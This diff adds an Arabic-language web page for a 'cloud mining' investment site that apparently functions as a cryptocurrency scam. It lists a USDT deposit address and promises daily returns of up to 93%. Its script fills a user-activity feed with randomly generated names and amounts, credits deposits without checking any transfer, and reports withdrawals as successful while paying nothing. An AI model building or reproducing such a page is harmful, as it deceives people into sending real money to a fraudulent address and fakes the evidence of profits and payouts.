@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>قوة التعدين السحابي - BTC | XRP | SOL</title>
+  <style>
+    /* --- أنماط لوحة تسجيل الدخول (Modal) --- */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 2000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.7);
+    }
+    .modal-content {
+      background-color: #fff;
+      margin: 15% auto;
+      padding: 20px;
+      border: 1px solid #888;
+      width: 80%;
+      max-width: 400px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .modal-content input {
+      width: 80%;
+      padding: 8px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    .modal-content button {
+      width: 85%;
+      padding: 10px;
+      background-color: #28a745;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .modal-content button:hover {
+      background-color: #218838;
+    }
+    /* --- أنماط الموقع العامة --- */
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #0A0D13, #1E1E2E, #0F0F24);
+      color: #00FFFF;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+    }
+    .container {
+      max-width: 800px;
+      margin: 80px auto;
+      padding: 20px;
+      background: linear-gradient(135deg, #1E1E2E, #0D1117);
+      border-radius: 10px;
+      box-shadow: 0 0 30px rgba(0,255,255,0.5);
+      position: relative;
+    }
+    #userHeader {
+      font-size: 16px;
+      color: #00FFFF;
+      margin-bottom: 10px;
+    }
+    h1, h3, p {
+      text-align: center;
+      margin: 5px 0;
+    }
+    .coins-container {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+    }
+    .coin-box {
+      padding: 15px;
+      margin: 10px;
+      border-radius: 10px;
+      width: 28%;
+      color: #fff;
+      transition: transform 0.3s ease-in-out;
+      box-shadow: 0 0 15px rgba(0,255,255,0.5);
+      position: relative;
+      overflow: hidden;
+    }
+    .coin-box:hover {
+      transform: scale(1.05);
+      animation: shake 0.5s ease-in-out;
+    }
+    .coin-box:nth-child(1) { background: radial-gradient(circle, #FF9900, #CC7700); }
+    .coin-box:nth-child(2) { background: radial-gradient(circle, #0096D6, #006699); }
+    .coin-box:nth-child(3) { background: radial-gradient(circle, #9945FF, #6600CC); }
+    .coin-icon {
+      width: 50px;
+      height: 50px;
+      margin-bottom: 5px;
+    }
+    input, select {
+      width: 90%;
+      padding: 8px;
+      margin: 5px 0;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      background-color: #222;
+      color: #fff;
+      box-shadow: 0 0 10px rgba(0,255,255,0.5);
+    }
+    button {
+      border: none;
+      padding: 10px;
+      cursor: pointer;
+      margin-top: 10px;
+      width: 100%;
+      border-radius: 5px;
+      font-weight: bold;
+      transition: 0.3s;
+      color: #fff;
+      background-color: #28a745;
+      text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+    }
+    button:hover {
+      background-color: #218838;
+      animation: pulse 0.5s infinite;
+    }
+    button:disabled {
+      background-color: #6c757d;
+      cursor: not-allowed;
+    }
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+    .toast {
+      background-color: #28a745;
+      color: #fff;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 5px;
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      animation: slideIn 1s forwards;
+    }
+    @keyframes slideIn {
+      from { bottom: -50px; }
+      to { bottom: 20px; }
+    }
+    /* --- ويدجت المحفظة --- */
+    .wallet-widget {
+      position: fixed;
+      top: 20px;
+      right: 10px;
+      background: rgba(0,0,0,0.85);
+      color: #00FFFF;
+      padding: 10px;
+      border-radius: 8px;
+      width: 180px;
+      font-size: 14px;
+      text-align: center;
+      z-index: 1000;
+      border: 2px solid #00FFFF;
+      box-shadow: 0 0 10px rgba(0,255,255,0.8);
+    }
+    .wallet-widget h3 {
+      margin: 0 0 5px 0;
+      font-size: 16px;
+    }
+    .wallet-widget p {
+      margin: 0;
+    }
+    /* --- لوحة جلسات التعدين --- */
+    #miningSessionsContainer {
+      position: fixed;
+      bottom: 80px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 90%;
+      max-width: 800px;
+      z-index: 1500;
+    }
+    .mining-session {
+      background: rgba(0, 0, 0, 0.9);
+      color: #fff;
+      border: 2px solid #00FFFF;
+      border-radius: 10px;
+      padding: 15px;
+      margin: 10px auto;
+      text-align: left;
+      box-shadow: 0 0 20px rgba(0,255,255,0.7);
+      position: relative;
+      animation: fadeIn 1s ease-out;
+    }
+    .mining-session h3 {
+      margin-top: 0;
+    }
+    .mining-session button {
+      background-color: #dc3545;
+      margin-top: 10px;
+    }
+    .mining-session button:hover {
+      background-color: #c82333;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    /* --- لوحة النشاط --- */
+    .activity-feed {
+      max-width: 800px;
+      margin: 20px auto;
+      background: #111;
+      border-radius: 10px;
+      padding: 10px;
+      text-align: left;
+      color: #0ff;
+      box-shadow: 0 0 20px rgba(0,255,255,0.5);
+    }
+    .activity-feed h3 {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .activity-table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    .activity-table th,
+    .activity-table td {
+      padding: 8px;
+      border-bottom: 1px solid #333;
+      font-size: 14px;
+    }
+    .activity-table tr:nth-child(even) {
+      background: #222;
+    }
+    .activity-table tr:nth-child(odd) {
+      background: #1a1a1a;
+    }
+    .new-row {
+      animation: fadeIn 1s ease-out;
+    }
+    /* --- سجل العمليات --- */
+    .transaction-log {
+      max-width: 800px;
+      margin: 20px auto;
+      background: #111;
+      border-radius: 10px;
+      padding: 10px;
+      text-align: center;
+      color: #0ff;
+      box-shadow: 0 0 20px rgba(0,255,255,0.5);
+    }
+    .transaction-log table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    .transaction-log th,
+    .transaction-log td {
+      padding: 8px;
+      border: 1px solid #333;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- لوحة تسجيل الدخول -->
+  <div id="loginModal" class="modal">
+    <div class="modal-content">
+      <h2>تسجيل الدخول</h2>
+      <input type="text" id="username" placeholder="اسم المستخدم">
+      <input type="text" id="code" placeholder="رمز مكون من 6 أرقام">
+      <button onclick="login()">تسجيل الدخول</button>
+    </div>
+  </div>
+
+  <div class="container">
+    <div id="userHeader"></div>
+    <h1>قوة التعدين السحابي</h1>
+    <div class="coins-container">
+      <!-- مثال لعملة بيتكوين -->
+      <div class="coin-box">
+        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=013" alt="Bitcoin" class="coin-icon">
+        <p class="coin-title">₿ بيتكوين (BTC)</p>
+        <p>مبلغ التعدين:</p>
+        <input type="number" id="amount_BTC" min="10" max="10000" step="1" value="10" oninput="updateProfit('BTC')">
+        <p>الأرباح اليومية: <span id="profit_BTC">0</span> $</p>
+        <p>نسبة الأرباح: <span id="rate_BTC">0%</span></p>
+        <button onclick="startMining('BTC')">⛏ ابدأ التعدين</button>
+      </div>
+      <!-- مثال لعملة ريبل -->
+      <div class="coin-box">
+        <img src="https://cryptologos.cc/logos/xrp-xrp-logo.png?v=013" alt="XRP" class="coin-icon">
+        <p class="coin-title">✕ ريبل (XRP)</p>
+        <p>مبلغ التعدين:</p>
+        <input type="number" id="amount_XRP" min="10" max="10000" step="1" value="10" oninput="updateProfit('XRP')">
+        <p>الأرباح اليومية: <span id="profit_XRP">0</span> $</p>
+        <p>نسبة الأرباح: <span id="rate_XRP">0%</span></p>
+        <button onclick="startMining('XRP')">⛏ ابدأ التعدين</button>
+      </div>
+      <!-- مثال لعملة سولانا -->
+      <div class="coin-box">
+        <img src="https://cryptologos.cc/logos/solana-sol-logo.png?v=013" alt="SOL" class="coin-icon">
+        <p class="coin-title">◎ سولانا (SOL)</p>
+        <p>مبلغ التعدين:</p>
+        <input type="number" id="amount_SOL" min="10" max="10000" step="1" value="10" oninput="updateProfit('SOL')">
+        <p>الأرباح اليومية: <span id="profit_SOL">0</span> $</p>
+        <p>نسبة الأرباح: <span id="rate_SOL">0%</span></p>
+        <button onclick="startMining('SOL')">⛏ ابدأ التعدين</button>
+      </div>
+    </div>
+    
+    <!-- قسم الإيداع -->
+    <h3>🟢 الإيداع (USDT)</h3>
+    <p>العنوان:</p>
+    <p><b>TLcsMnKL5YxKEPZ1oxPb8qL6DZp7EpAXyr</b></p>
+    <input type="text" id="walletAddress" placeholder="أدخل عنوان محفظتك">
+    <input type="number" id="amount" placeholder="أدخل المبلغ">
+    <button onclick="deposit()">إيداع</button>
+      
+    <!-- قسم السحب -->
+    <h3>🏦 السحب</h3>
+    <input type="text" id="withdrawWallet" placeholder="أدخل عنوان محفظتك للسحب">
+    <input type="number" id="withdrawAmount" placeholder="أدخل المبلغ">
+    <select id="currency">
+      <option value="BTC">بيتكوين (BTC)</option>
+      <option value="XRP">ريبل (XRP)</option>
+      <option value="SOL">سولانا (SOL)</option>
+    </select>
+    <button onclick="withdraw()">سحب</button>
+  </div>
+
+  <!-- ويدجت المحفظة -->
+  <div class="wallet-widget">
+    <h3>محفظتك</h3>
+    <p>الرصيد: $<span id="walletBalance">0</span></p>
+  </div>
+
+  <!-- حاوية جلسات التعدين -->
+  <div id="miningSessionsContainer"></div>
+
+  <!-- لوحة النشاط -->
+  <div class="activity-feed">
+    <h3>نشاط المستخدمين</h3>
+    <table class="activity-table" id="activityTable">
+      <thead>
+        <tr>
+          <th>الاسم</th>
+          <th>الحدث</th>
+          <th>المبلغ</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- ستضاف الصفوف هنا تلقائيًا -->
+      </tbody>
+    </table>
+  </div>
+
+  <!-- سجل العمليات -->
+  <div class="transaction-log">
+    <h3>سجل الودائع والسحوبات والأحداث</h3>
+    <table id="transactionTable">
+      <thead>
+        <tr>
+          <th>النوع</th>
+          <th>المبلغ</th>
+          <th>التاريخ</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- ستضاف الصفوف هنا تلقائيًا -->
+      </tbody>
+    </table>
+  </div>
+
+  <script>
+    // بيانات عشوائية لتوليد نشاط المستخدمين
+    const names = ["فاطمة", "محمد", "حسين", "عائشة", "علي", "سارة", "يوسف", "نور", "خالد", "ريم"];
+    const events = ["بدأ التعدين", "إيداع", "سحب"];
+    function getRandomNumber(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+    function updateActivityFeed() {
+      const tableBody = document.getElementById("activityTable").querySelector("tbody");
+      if (!tableBody) return;
+      const tr = document.createElement("tr");
+      tr.classList.add("new-row");
+      const randomName = names[getRandomNumber(0, names.length - 1)];
+      const randomEvent = events[getRandomNumber(0, events.length - 1)];
+      const randomAmount = getRandomNumber(50, 10000);
+      tr.innerHTML = `<td>${randomName}</td><td>${randomEvent}</td><td>$${randomAmount}</td>`;
+      tableBody.insertBefore(tr, tableBody.firstChild);
+      while (tableBody.childNodes.length > 10) {
+        tableBody.removeChild(tableBody.lastChild);
+      }
+    }
+    setInterval(updateActivityFeed, 5000);
+
+    // دالة عرض الرسائل (Toast)
+    function showSuccessMessage(message) {
+      let toast = document.createElement('div');
+      toast.className = 'toast';
+      toast.innerText = message;
+      document.body.appendChild(toast);
+      setTimeout(() => { toast.remove(); }, 3000);
+    }
+
+    // تشغيل الصوت
+    function playSound(soundUrl) {
+      soundUrl = soundUrl || "https://www.soundjay.com/button/beep-07.wav";
+      var audio = new Audio(soundUrl);
+      audio.play().catch(function(error) {
+        console.error("Error playing sound:", error);
+      });
+    }
+
+    // تحديث رصيد المحفظة
+    function updateWalletUI() {
+      let balance = localStorage.getItem("walletBalance") || "0";
+      document.getElementById("walletBalance").innerText = balance;
+    }
+
+    // دالة لحساب الأرباح المتراكمة
+    function calculateAccumulated(startTime, profitPerSecond) {
+      const elapsedSeconds = (Date.now() - startTime) / 1000;
+      return elapsedSeconds * profitPerSecond;
+    }
+
+    // تخزين واستعادة جلسات التعدين (بدون خاصية timer)
+    function saveSessions(sessions) {
+      const sessionsToStore = sessions.map(s => ({
+        id: s.id,
+        coin: s.coin,
+        invested: s.invested,
+        multiplier: s.multiplier,
+        dailyProfit: s.dailyProfit,
+        profitPerSecond: s.profitPerSecond,
+        startTime: s.startTime
+      }));
+      localStorage.setItem("miningSessions", JSON.stringify(sessionsToStore));
+    }
+    
+    function loadSessions() {
+      return JSON.parse(localStorage.getItem("miningSessions")) || [];
+    }
+
+    // مصفوفة جلسات التعدين
+    let miningSessions = loadSessions();
+
+    // إعادة تهيئة المؤقت لكل جلسة
+    function initTimerForSession(session) {
+      session.timer = setInterval(() => {
+        let accumulated = calculateAccumulated(session.startTime, session.profitPerSecond);
+        session.accumulated = accumulated;
+        let div = document.getElementById(session.id);
+        if (div) {
+          div.querySelector(".session-accumulated").innerText = accumulated.toFixed(2);
+        }
+      }, 1000);
+    }
+
+    // إعادة رسم الجلسات
+    function renderSessions() {
+      const container = document.getElementById("miningSessionsContainer");
+      container.innerHTML = "";
+      miningSessions.forEach(session => {
+        session.accumulated = calculateAccumulated(session.startTime, session.profitPerSecond);
+        const div = document.createElement("div");
+        div.className = "mining-session";
+        div.id = session.id;
+        div.innerHTML = `
+          <h3>جهاز التعدين: ${session.coin}</h3>
+          <p>المبلغ المستثمر: $${session.invested}</p>
+          <p>النسبة اليومية: ${(session.multiplier * 100).toFixed(2)}%</p>
+          <p>الأرباح المتراكمة: $<span class="session-accumulated">${session.accumulated.toFixed(2)}</span></p>
+          <button onclick="stopMining('${session.id}')">إنهاء التعدين</button>
+        `;
+        container.appendChild(div);
+        if (!session.timer) {
+          initTimerForSession(session);
+        }
+      });
+    }
+
+    // دالة إضافة سجل العمليات
+    function addTransactionLog(type, amount) {
+      const tableBody = document.getElementById("transactionTable").querySelector("tbody");
+      const tr = document.createElement("tr");
+      const date = new Date().toLocaleString();
+      tr.innerHTML = `<td>${type}</td><td>$${amount}</td><td>${date}</td>`;
+      tableBody.insertBefore(tr, tableBody.firstChild);
+    }
+
+    // دالة بدء التعدين
+    function startMining(coin) {
+      let walletBalance = parseFloat(localStorage.getItem("walletBalance") || "0");
+      let investment = parseFloat(document.getElementById(`amount_${coin}`).value);
+      if (walletBalance < investment) {
+        alert("رصيدك غير كافي");
+        return;
+      }
+      let newBalance = walletBalance - investment;
+      localStorage.setItem("walletBalance", newBalance);
+      updateWalletUI();
+      playSound("https://www.soundjay.com/misc/small-bell-ring-01a.mp3");
+      showSuccessMessage(`تم بدء التعدين لعملة ${coin}`);
+      addTransactionLog("بدء التعدين", investment);
+      let multiplier = 0;
+      switch(coin) {
+        case "BTC":
+          if(investment >= 10 && investment <= 100) multiplier = 0.05;
+          else if(investment > 100 && investment <= 1000) multiplier = 0.07;
+          else if(investment > 1000 && investment <= 5000) multiplier = 0.10;
+          else if(investment > 5000 && investment < 10000) multiplier = 0.80;
+          else if(investment === 10000) multiplier = 0.93;
+          break;
+        case "XRP":
+          if(investment >= 10 && investment <= 100) multiplier = 0.04;
+          else if(investment > 100 && investment <= 1000) multiplier = 0.06;
+          else if(investment > 1000 && investment <= 5000) multiplier = 0.08;
+          else if(investment > 5000 && investment < 10000) multiplier = 0.65;
+          else if(investment === 10000) multiplier = 0.70;
+          break;
+        case "SOL":
+          if(investment >= 10 && investment <= 100) multiplier = 0.045;
+          else if(investment > 100 && investment <= 1000) multiplier = 0.065;
+          else if(investment > 1000 && investment <= 5000) multiplier = 0.085;
+          else if(investment > 5000 && investment < 10000) multiplier = 0.64;
+          else if(investment === 10000) multiplier = 0.66;
+          break;
+        default:
+          multiplier = 0.02;
+          break;
+      }
+      let dailyProfit = investment * multiplier;
+      let profitPerSecond = dailyProfit / 86400;
+      let session = {
+        id: "session_" + coin + "_" + Date.now(),
+        coin: coin,
+        invested: investment,
+        multiplier: multiplier,
+        dailyProfit: dailyProfit,
+        profitPerSecond: profitPerSecond,
+        startTime: Date.now(),
+        accumulated: 0
+      };
+      miningSessions.push(session);
+      saveSessions(miningSessions);
+      renderSessions();
+    }
+
+    // دالة إنهاء التعدين
+    function stopMining(sessionId) {
+      let sessionIndex = miningSessions.findIndex(s => s.id === sessionId);
+      if (sessionIndex !== -1) {
+        let session = miningSessions[sessionIndex];
+        session.accumulated = calculateAccumulated(session.startTime, session.profitPerSecond);
+        let currentBalance = parseFloat(localStorage.getItem("walletBalance") || "0");
+        let newBalance = currentBalance + session.invested + session.accumulated;
+        localStorage.setItem("walletBalance", newBalance);
+        updateWalletUI();
+        showSuccessMessage(`تم إنهاء التعدين لجهاز ${session.coin}، واسترجاع رأس المال مع الأرباح`);
+        addTransactionLog("إنهاء التعدين", session.invested + session.accumulated);
+        clearInterval(session.timer);
+        miningSessions.splice(sessionIndex, 1);
+        saveSessions(miningSessions);
+        renderSessions();
+      }
+    }
+
+    // دالة الإيداع
+    function deposit() {
+      let amount = parseFloat(document.getElementById('amount').value);
+      let walletAddress = document.getElementById('walletAddress').value;
+      if (amount <= 0 || !walletAddress) {
+        alert('يرجى إدخال مبلغ صحيح وعنوان محفظة.');
+        return;
+      }
+      playSound();
+      let currentBalance = parseFloat(localStorage.getItem("walletBalance") || "0");
+      let newBalance = currentBalance + amount;
+      localStorage.setItem("walletBalance", newBalance);
+      updateWalletUI();
+      showSuccessMessage('جاري التحقق من الايداع');
+      addTransactionLog("إيداع", amount);
+    }
+
+    // دالة السحب
+    function withdraw() {
+      let amount = parseFloat(document.getElementById('withdrawAmount').value);
+      let wallet = document.getElementById('withdrawWallet').value;
+      if (!wallet || amount <= 0) {
+        alert('يرجى إدخال المبلغ وعنوان المحفظة بشكل صحيح.');
+        return;
+      }
+      let currentBalance = parseFloat(localStorage.getItem("walletBalance") || "0");
+      if (amount > currentBalance) {
+        alert('رصيدك غير كافي');
+        return;
+      }
+      playSound();
+      let newBalance = currentBalance - amount;
+      localStorage.setItem("walletBalance", newBalance);
+      updateWalletUI();
+      showSuccessMessage('تم السحب بنجاح');
+      addTransactionLog("سحب", amount);
+    }
+
+    // دالة تسجيل الدخول
+    function login() {
+      var username = document.getElementById("username").value.trim();
+      var code = document.getElementById("code").value.trim();
+      if (username === "" || code === "") {
+        alert("يرجى تعبئة جميع الحقول");
+        return;
+      }
+      if (code.length !== 6 || isNaN(code)) {
+        alert("يرجى إدخال رمز مكون من 6 أرقام");
+        return;
+      }
+      localStorage.setItem("loggedIn", "true");
+      localStorage.setItem("loginName", username);
+      localStorage.setItem("loginCode", code);
+      document.getElementById("loginModal").style.display = "none";
+      let storedBalance = localStorage.getItem("walletBalance");
+      if (!storedBalance) {
+        localStorage.setItem("walletBalance", "0");
+        storedBalance = "0";
+      }
+      document.getElementById("walletBalance").innerText = storedBalance;
+      document.getElementById("userHeader").innerText = "مرحباً، " + username;
+    }
+
+    // دالة تحديث الأرباح عند تغيير المبلغ مع عرض النسبة
+    function updateProfit(coin) {
+      let amount = parseFloat(document.getElementById(`amount_${coin}`).value) || 0;
+      let multiplier = 0;
+      if (coin === "BTC") {
+        if(amount >= 10 && amount <= 100) multiplier = 0.05;
+        else if(amount > 100 && amount <= 1000) multiplier = 0.07;
+        else if(amount > 1000 && amount <= 5000) multiplier = 0.10;
+        else if(amount > 5000 && amount < 10000) multiplier = 0.80;
+        else if(amount === 10000) multiplier = 0.93;
+      } else if (coin === "XRP") {
+        if(amount >= 10 && amount <= 100) multiplier = 0.04;
+        else if(amount > 100 && amount <= 1000) multiplier = 0.06;
+        else if(amount > 1000 && amount <= 5000) multiplier = 0.08;
+        else if(amount > 5000 && amount < 10000) multiplier = 0.65;
+        else if(amount === 10000) multiplier = 0.70;
+      } else if (coin === "SOL") {
+        if(amount >= 10 && amount <= 100) multiplier = 0.045;
+        else if(amount > 100 && amount <= 1000) multiplier = 0.065;
+        else if(amount > 1000 && amount <= 5000) multiplier = 0.085;
+        else if(amount > 5000 && amount < 10000) multiplier = 0.64;
+        else if(amount === 10000) multiplier = 0.66;
+      }
+      let profit = amount * multiplier;
+      let rate = (multiplier * 100).toFixed(2) + "%";
+      console.log("عملة " + coin + " - المبلغ: " + amount + ", المعامل: " + multiplier);
+      document.getElementById(`profit_${coin}`).innerText = profit.toFixed(2);
+      document.getElementById(`rate_${coin}`).innerText = rate;
+    }
+
+    // عند تحميل الصفحة: استعادة الجلسات وتحديث الواجهة
+    window.onload = function() {
+      updateWalletUI();
+      miningSessions = loadSessions();
+      miningSessions.forEach(session => {
+        initTimerForSession(session);
+      });
+      renderSessions();
+      if(localStorage.getItem("loggedIn") !== "true"){
+        document.getElementById("loginModal").style.display = "block";
+      }
+    };
+
+    // تحديث الرصيد كل ثانية (اختياري)
+    setInterval(function() {
+      let storedBalance = localStorage.getItem("walletBalance") || "0";
+      document.getElementById("walletBalance").innerText = storedBalance;
+    }, 1000);
+  </script>
+
+</body>
+</html>
